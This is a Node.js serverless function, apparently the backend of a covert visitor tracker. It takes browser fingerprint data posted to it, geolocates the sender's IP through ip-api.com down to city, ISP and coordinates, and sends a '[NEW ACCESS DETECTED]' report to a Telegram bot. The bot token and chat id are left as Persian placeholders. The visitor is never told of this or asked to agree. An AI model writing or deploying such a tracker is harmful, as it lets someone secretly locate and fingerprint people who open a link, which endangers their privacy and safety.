module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  const data = req.body;

  function countryCodeToFlagEmoji(code) {
    if (!code) return '🏳️';
    return code.toUpperCase().replace(/./g, char =>
      String.fromCodePoint(127397 + char.charCodeAt())
    );
  }

  const ip =
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.connection.remoteAddress;

  let ipInfo = { query: ip };
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,countryCode,country,regionName,city,isp,query,org,timezone,as,lat,lon`);
    ipInfo = await response.json();
  } catch (err) {
    ipInfo = { query: ip, error: 'IP info fetch failed' };
  }

  const flag = countryCodeToFlagEmoji(ipInfo.countryCode || '');

  const message = `
📡 [NEW ACCESS DETECTED]
🧠 Agent: ${data.userAgent}
📍 IP: ${ipInfo.query}
🌐 Location: ${ipInfo.city}, ${ipInfo.regionName} ${flag}
🗺️ Country: ${ipInfo.country}
📶 ISP: ${ipInfo.isp}
🏢 Org: ${ipInfo.org}
🕰️ Timezone: ${ipInfo.timezone}
📡 ASN: ${ipInfo.as}
📍 Coordinates: ${ipInfo.lat}, ${ipInfo.lon}
🖥️ Platform: ${data.platform}
🧮 CPU Cores: ${data.cores}
🗣️ Lang: ${data.language}
💾 RAM: ${data.memory || 'N/A'} GB
🔋 Battery: ${data.battery?.level * 100 || 'N/A'}%
🔌 Charging: ${data.battery?.charging ? 'Yes' : 'No'}
📱 Touch: ${data.touch ? 'Yes' : 'No'}
🖼️ Screen: ${data.screen.width}x${data.screen.height}
  `;

  const tgURL = `https://api.telegram.org/botتوکن_ربات/sendMessage`;

  await fetch(tgURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: 'شناسه_چت', text: message })
  });

  res.status(200).json({ status: 'ok' });
};